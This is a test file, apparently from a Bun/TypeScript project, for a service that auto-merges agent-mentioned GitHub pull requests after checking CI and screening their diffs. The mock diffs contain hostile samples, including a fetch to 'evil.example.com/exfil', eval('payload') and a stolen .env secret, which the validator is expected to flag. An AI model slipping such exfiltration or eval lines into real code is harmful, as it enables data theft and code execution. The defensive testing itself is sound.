import { Database } from 'bun:sqlite';
import { afterEach, beforeEach, describe, expect, test } from 'bun:test';
import { runMigrations } from '../db/schema';
import { AutoMergeService, type RunGhFn } from '../polling/auto-merge';

let db: Database;

beforeEach(() => {
  db = new Database(':memory:');
  db.exec('PRAGMA foreign_keys = ON');
  runMigrations(db);
});

afterEach(() => {
  db.close();
});

function insertPollingConfig(repo: string, username: string, overrides: Record<string, string> = {}) {
  db.query(`INSERT INTO agents (id, name, model, system_prompt) VALUES ('agent-1', 'TestAgent', 'test', 'test')
              ON CONFLICT DO NOTHING`).run();
  db.query(`INSERT INTO projects (id, name, working_dir) VALUES ('proj-1', 'TestProject', '/tmp/test')
              ON CONFLICT DO NOTHING`).run();
  db.query(`INSERT INTO mention_polling_configs (id, repo, mention_username, agent_id, project_id, status)
              VALUES (?, ?, ?, 'agent-1', 'proj-1', ?)`).run(
    overrides.id ?? crypto.randomUUID(),
    repo,
    username,
    overrides.status ?? 'active',
  );
}

// ── Lifecycle ────────────────────────────────────────────────────────

describe('AutoMergeService lifecycle', () => {
  test('start sets running and stop clears it', () => {
    const service = new AutoMergeService(db, async () => ({ ok: false, stdout: '', stderr: '' }));
    service.start();
    service.stop();
    // No assertion needed — just verify no throw
  });

  test('double start is idempotent', () => {
    const service = new AutoMergeService(db, async () => ({ ok: false, stdout: '', stderr: '' }));
    service.start();
    service.start(); // Should not throw or create duplicate timers
    service.stop();
  });

  test('double stop is safe', () => {
    const service = new AutoMergeService(db, async () => ({ ok: false, stdout: '', stderr: '' }));
    service.start();
    service.stop();
    service.stop(); // Should not throw
  });
});

// ── checkAll ─────────────────────────────────────────────────────────

describe('AutoMergeService.checkAll', () => {
  test('does nothing when not running', async () => {
    let called = false;
    const service = new AutoMergeService(db, async () => {
      called = true;
      return { ok: false, stdout: '', stderr: '' };
    });
    await service.checkAll();
    expect(called).toBe(false);
  });

  test('does nothing with no active configs', async () => {
    let called = false;
    const runGh: RunGhFn = async () => {
      called = true;
      return { ok: false, stdout: '', stderr: '' };
    };
    const service = new AutoMergeService(db, runGh);
    (service as any).running = true;
    await service.checkAll();
    expect(called).toBe(false);
  });

  test('deduplicates configs with same repo+username', async () => {
    insertPollingConfig('org/repo', 'corvid-agent');
    insertPollingConfig('org/repo', 'corvid-agent');

    const calls: string[][] = [];
    const runGh: RunGhFn = async (args) => {
      calls.push(args);
      return { ok: true, stdout: JSON.stringify({ items: [] }), stderr: '' };
    };

    const service = new AutoMergeService(db, runGh);
    (service as any).running = true;
    await service.checkAll();

    // Should only search once despite two configs
    expect(calls.length).toBe(1);
  });

  test('skips inactive configs', async () => {
    insertPollingConfig('org/repo', 'corvid-agent', { status: 'paused' });

    let called = false;
    const runGh: RunGhFn = async () => {
      called = true;
      return { ok: false, stdout: '', stderr: '' };
    };

    const service = new AutoMergeService(db, runGh);
    (service as any).running = true;
    await service.checkAll();
    expect(called).toBe(false);
  });

  test('merges PR when all checks pass and diff is clean', async () => {
    insertPollingConfig('CorvidLabs/corvid-agent', 'corvid-agent');

    const calls: string[][] = [];
    const runGh: RunGhFn = async (args) => {
      calls.push(args);
      const key = args.join(' ');
      if (key.includes('search/issues')) {
        return {
          ok: true,
          stdout: JSON.stringify({
            items: [{ number: 42, html_url: 'https://github.com/CorvidLabs/corvid-agent/pull/42' }],
          }),
          stderr: '',
        };
      }
      if (key.includes('pr checks')) {
        return { ok: true, stdout: 'pass', stderr: '' };
      }
      if (key.includes('repos/') && key.includes('/pulls/')) {
        // Diff validation — return a clean diff
        return { ok: true, stdout: '+++ b/server/routes/health.ts\n+// safe change', stderr: '' };
      }
      if (key.includes('pr merge')) {
        return { ok: true, stdout: 'Merged', stderr: '' };
      }
      return { ok: false, stdout: '', stderr: 'not mocked' };
    };

    const service = new AutoMergeService(db, runGh);
    (service as any).running = true;
    await service.checkAll();

    // Should have made: search, checks, diff validation, merge
    expect(calls.length).toBe(4);
    expect(calls[3].join(' ')).toContain('pr merge');
    expect(calls[3].join(' ')).toContain('--squash');
  });

  test('skips PR when checks fail', async () => {
    insertPollingConfig('CorvidLabs/corvid-agent', 'corvid-agent');

    const calls: string[][] = [];
    const runGh: RunGhFn = async (args) => {
      calls.push(args);
      const key = args.join(' ');
      if (key.includes('search/issues')) {
        return {
          ok: true,
          stdout: JSON.stringify({
            items: [{ number: 42, html_url: 'https://github.com/CorvidLabs/corvid-agent/pull/42' }],
          }),
          stderr: '',
        };
      }
      if (key.includes('pr checks')) {
        return { ok: true, stdout: 'fail', stderr: '' };
      }
      return { ok: false, stdout: '', stderr: '' };
    };

    const service = new AutoMergeService(db, runGh);
    (service as any).running = true;
    await service.checkAll();

    // Should have made: search, checks — no merge
    expect(calls.length).toBe(2);
  });

  test('skips PR when no checks exist', async () => {
    insertPollingConfig('CorvidLabs/corvid-agent', 'corvid-agent');

    const calls: string[][] = [];
    const runGh: RunGhFn = async (args) => {
      calls.push(args);
      const key = args.join(' ');
      if (key.includes('search/issues')) {
        return {
          ok: true,
          stdout: JSON.stringify({
            items: [{ number: 42, html_url: 'https://github.com/CorvidLabs/corvid-agent/pull/42' }],
          }),
          stderr: '',
        };
      }
      if (key.includes('pr checks')) {
        return { ok: true, stdout: 'none', stderr: '' };
      }
      return { ok: false, stdout: '', stderr: '' };
    };

    const service = new AutoMergeService(db, runGh);
    (service as any).running = true;
    await service.checkAll();

    // search + checks, no merge
    expect(calls.length).toBe(2);
  });

  test('handles empty search results', async () => {
    insertPollingConfig('CorvidLabs/corvid-agent', 'corvid-agent');

    const calls: string[][] = [];
    const runGh: RunGhFn = async (args) => {
      calls.push(args);
      return { ok: true, stdout: JSON.stringify({ items: [] }), stderr: '' };
    };

    const service = new AutoMergeService(db, runGh);
    (service as any).running = true;
    await service.checkAll();

    // Just the search call, no checks or merges
    expect(calls.length).toBe(1);
  });

  test('uses org: qualifier for org-level configs', async () => {
    insertPollingConfig('CorvidLabs', 'corvid-agent');

    const calls: string[][] = [];
    const runGh: RunGhFn = async (args) => {
      calls.push(args);
      return { ok: true, stdout: JSON.stringify({ items: [] }), stderr: '' };
    };

    const service = new AutoMergeService(db, runGh);
    (service as any).running = true;
    await service.checkAll();

    // org-level config should use org: prefix
    const searchCall = calls[0].join(' ');
    expect(searchCall).toContain('org:CorvidLabs');
  });

  test('continues on merge failure', async () => {
    insertPollingConfig('CorvidLabs/corvid-agent', 'corvid-agent');

    const runGh: RunGhFn = async (args) => {
      const key = args.join(' ');
      if (key.includes('search/issues')) {
        return {
          ok: true,
          stdout: JSON.stringify({
            items: [
              { number: 1, html_url: 'https://github.com/CorvidLabs/corvid-agent/pull/1' },
              { number: 2, html_url: 'https://github.com/CorvidLabs/corvid-agent/pull/2' },
            ],
          }),
          stderr: '',
        };
      }
      if (key.includes('pr checks')) {
        return { ok: true, stdout: 'pass', stderr: '' };
      }
      if (key.includes('repos/') && key.includes('/pulls/')) {
        return { ok: true, stdout: '+++ b/server/routes/health.ts\n+// safe', stderr: '' };
      }
      if (key.includes('pr merge')) {
        return { ok: false, stdout: '', stderr: 'merge conflict' };
      }
      return { ok: false, stdout: '', stderr: '' };
    };

    const service = new AutoMergeService(db, runGh);
    (service as any).running = true;
    // Should not throw even when merge fails
    await service.checkAll();
  });

  test('handles search API failure gracefully', async () => {
    insertPollingConfig('CorvidLabs/corvid-agent', 'corvid-agent');

    const runGh: RunGhFn = async () => {
      return { ok: false, stdout: '', stderr: 'API error' };
    };

    const service = new AutoMergeService(db, runGh);
    (service as any).running = true;
    // Should not throw
    await service.checkAll();
  });

  test('comments on PR when diff modifies protected files (does not close)', async () => {
    insertPollingConfig('CorvidLabs/corvid-agent', 'corvid-agent');

    const calls: string[][] = [];
    const runGh: RunGhFn = async (args) => {
      calls.push(args);
      const key = args.join(' ');
      if (key.includes('search/issues')) {
        return {
          ok: true,
          stdout: JSON.stringify({
            items: [{ number: 42, html_url: 'https://github.com/CorvidLabs/corvid-agent/pull/42' }],
          }),
          stderr: '',
        };
      }
      if (key.includes('pr checks')) {
        return { ok: true, stdout: 'pass', stderr: '' };
      }
      if (key.includes('repos/') && key.includes('/pulls/')) {
        return { ok: true, stdout: '+++ b/server/process/sdk-process.ts\n+// malicious change', stderr: '' };
      }
      if (key.includes('pr comment')) {
        return { ok: true, stdout: '', stderr: '' };
      }
      return { ok: false, stdout: '', stderr: '' };
    };

    const service = new AutoMergeService(db, runGh);
    (service as any).running = true;
    await service.checkAll();

    // Should NOT have merged — should have commented on the PR
    const mergeCall = calls.find((c) => c.join(' ').includes('pr merge'));
    expect(mergeCall).toBeUndefined();
    const closeCall = calls.find((c) => c.join(' ').includes('pr close'));
    expect(closeCall).toBeUndefined();
    const commentCall = calls.find((c) => c.join(' ').includes('pr comment'));
    expect(commentCall).toBeDefined();
  });

  test('comments on PR when diff has unapproved external fetches (does not close)', async () => {
    insertPollingConfig('CorvidLabs/corvid-agent', 'corvid-agent');

    const calls: string[][] = [];
    const runGh: RunGhFn = async (args) => {
      calls.push(args);
      const key = args.join(' ');
      if (key.includes('search/issues')) {
        return {
          ok: true,
          stdout: JSON.stringify({
            items: [{ number: 42, html_url: 'https://github.com/CorvidLabs/corvid-agent/pull/42' }],
          }),
          stderr: '',
        };
      }
      if (key.includes('pr checks')) {
        return { ok: true, stdout: 'pass', stderr: '' };
      }
      if (key.includes('repos/') && key.includes('/pulls/')) {
        return {
          ok: true,
          stdout: '+++ b/server/routes/new.ts\n+const r = await fetch("https://evil.example.com/exfil")',
          stderr: '',
        };
      }
      if (key.includes('pr comment')) {
        return { ok: true, stdout: '', stderr: '' };
      }
      return { ok: false, stdout: '', stderr: '' };
    };

    const service = new AutoMergeService(db, runGh);
    (service as any).running = true;
    await service.checkAll();

    const mergeCall = calls.find((c) => c.join(' ').includes('pr merge'));
    expect(mergeCall).toBeUndefined();
    const closeCall = calls.find((c) => c.join(' ').includes('pr close'));
    expect(closeCall).toBeUndefined();
    const commentCall = calls.find((c) => c.join(' ').includes('pr comment'));
    expect(commentCall).toBeDefined();
  });

  test('only comments on PR once across multiple checkAll cycles', async () => {
    insertPollingConfig('CorvidLabs/corvid-agent', 'corvid-agent');

    const commentCalls: string[][] = [];
    const runGh: RunGhFn = async (args) => {
      const key = args.join(' ');
      if (key.includes('search/issues')) {
        return {
          ok: true,
          stdout: JSON.stringify({
            items: [{ number: 42, html_url: 'https://github.com/CorvidLabs/corvid-agent/pull/42' }],
          }),
          stderr: '',
        };
      }
      if (key.includes('pr checks')) {
        return { ok: true, stdout: 'pass', stderr: '' };
      }
      if (key.includes('repos/') && key.includes('/pulls/')) {
        return { ok: true, stdout: '+++ b/server/process/sdk-process.ts\n+// protected file', stderr: '' };
      }
      if (key.includes('pr comment')) {
        commentCalls.push(args);
        return { ok: true, stdout: '', stderr: '' };
      }
      return { ok: false, stdout: '', stderr: '' };
    };

    const service = new AutoMergeService(db, runGh);
    (service as any).running = true;

    // Run checkAll three times — should only comment once
    await service.checkAll();
    await service.checkAll();
    await service.checkAll();

    expect(commentCalls.length).toBe(1);
  });

  test('skips PR when diff fetch fails (transient error)', async () => {
    insertPollingConfig('CorvidLabs/corvid-agent', 'corvid-agent');

    const calls: string[][] = [];
    const runGh: RunGhFn = async (args) => {
      calls.push(args);
      const key = args.join(' ');
      if (key.includes('search/issues')) {
        return {
          ok: true,
          stdout: JSON.stringify({
            items: [{ number: 42, html_url: 'https://github.com/CorvidLabs/corvid-agent/pull/42' }],
          }),
          stderr: '',
        };
      }
      if (key.includes('pr checks')) {
        return { ok: true, stdout: 'pass', stderr: '' };
      }
      if (key.includes('repos/') && key.includes('/pulls/')) {
        // Diff fetch fails (rate limit, network error, etc.)
        return { ok: false, stdout: '', stderr: 'API rate limit exceeded' };
      }
      return { ok: false, stdout: '', stderr: '' };
    };

    const service = new AutoMergeService(db, runGh);
    (service as any).running = true;
    await service.checkAll();

    // Should NOT merge and should NOT comment — just skip
    const mergeCall = calls.find((c) => c.join(' ').includes('pr merge'));
    expect(mergeCall).toBeUndefined();
    const commentCall = calls.find((c) => c.join(' ').includes('pr comment'));
    expect(commentCall).toBeUndefined();
  });

  test('comments on PR when diff has malicious code patterns (does not close)', async () => {
    insertPollingConfig('CorvidLabs/corvid-agent', 'corvid-agent');

    const calls: string[][] = [];
    const runGh: RunGhFn = async (args) => {
      calls.push(args);
      const key = args.join(' ');
      if (key.includes('search/issues')) {
        return {
          ok: true,
          stdout: JSON.stringify({
            items: [{ number: 42, html_url: 'https://github.com/CorvidLabs/corvid-agent/pull/42' }],
          }),
          stderr: '',
        };
      }
      if (key.includes('pr checks')) {
        return { ok: true, stdout: 'pass', stderr: '' };
      }
      if (key.includes('repos/') && key.includes('/pulls/')) {
        return {
          ok: true,
          stdout: '+++ b/server/routes/new.ts\n+eval("malicious code")',
          stderr: '',
        };
      }
      if (key.includes('pr comment')) {
        return { ok: true, stdout: '', stderr: '' };
      }
      return { ok: false, stdout: '', stderr: '' };
    };

    const service = new AutoMergeService(db, runGh);
    (service as any).running = true;
    await service.checkAll();

    const mergeCall = calls.find((c) => c.join(' ').includes('pr merge'));
    expect(mergeCall).toBeUndefined();
    const closeCall = calls.find((c) => c.join(' ').includes('pr close'));
    expect(closeCall).toBeUndefined();
    const commentCall = calls.find((c) => c.join(' ').includes('pr comment'));
    expect(commentCall).toBeDefined();
  });
});

// ── validateDiff unit tests ──────────────────────────────────────────

describe('AutoMergeService.validateDiff', () => {
  test('returns null for clean diff', async () => {
    const runGh: RunGhFn = async () => ({
      ok: true,
      stdout: '+++ b/server/routes/health.ts\n+export function check() { return true; }',
      stderr: '',
    });

    const service = new AutoMergeService(db, runGh);
    const result = await service.validateDiff('CorvidLabs/corvid-agent', 1);
    expect(result).toBeNull();
  });

  test('rejects diff modifying sdk-process.ts', async () => {
    const runGh: RunGhFn = async () => ({
      ok: true,
      stdout: '+++ b/server/process/sdk-process.ts\n+// evil change',
      stderr: '',
    });

    const service = new AutoMergeService(db, runGh);
    const result = await service.validateDiff('CorvidLabs/corvid-agent', 1);
    expect(result).toContain('Protected files modified');
    expect(result).toContain('sdk-process.ts');
  });

  test('rejects diff modifying .env', async () => {
    const runGh: RunGhFn = async () => ({
      ok: true,
      stdout: '+++ b/.env\n+SECRET_KEY=stolen',
      stderr: '',
    });

    const service = new AutoMergeService(db, runGh);
    const result = await service.validateDiff('CorvidLabs/corvid-agent', 1);
    expect(result).toContain('Protected files modified');
  });

  test('rejects diff with eval()', async () => {
    const runGh: RunGhFn = async () => ({
      ok: true,
      stdout: '+++ b/server/routes/new.ts\n+eval("payload")',
      stderr: '',
    });

    const service = new AutoMergeService(db, runGh);
    const result = await service.validateDiff('CorvidLabs/corvid-agent', 1);
    expect(result).toContain('Suspicious code patterns');
  });

  test('rejects diff with unapproved fetch domain', async () => {
    const runGh: RunGhFn = async () => ({
      ok: true,
      stdout: '+++ b/server/routes/new.ts\n+await fetch("https://evil.example.com/exfil")',
      stderr: '',
    });

    const service = new AutoMergeService(db, runGh);
    const result = await service.validateDiff('CorvidLabs/corvid-agent', 1);
    expect(result).toContain('Unapproved external domains');
  });

  test('returns skip when diff cannot be fetched (transient failure)', async () => {
    const runGh: RunGhFn = async () => ({
      ok: false,
      stdout: '',
      stderr: 'API error',
    });

    const service = new AutoMergeService(db, runGh);
    const result = await service.validateDiff('CorvidLabs/corvid-agent', 1);
    expect(result).toBe('skip');
  });

  test('catches multiple issues in one diff', async () => {
    const runGh: RunGhFn = async () => ({
      ok: true,
      stdout: [
        '+++ b/server/process/sdk-process.ts',
        '+// modified protected file',
        '+++ b/server/routes/bad.ts',
        '+eval("payload")',
        '+await fetch("https://evil.example.com/exfil")',
      ].join('\n'),
      stderr: '',
    });

    const service = new AutoMergeService(db, runGh);
    const result = await service.validateDiff('CorvidLabs/corvid-agent', 1);
    expect(result).toContain('Protected files modified');
    expect(result).toContain('Suspicious code patterns');
    expect(result).toContain('Unapproved external domains');
  });
});
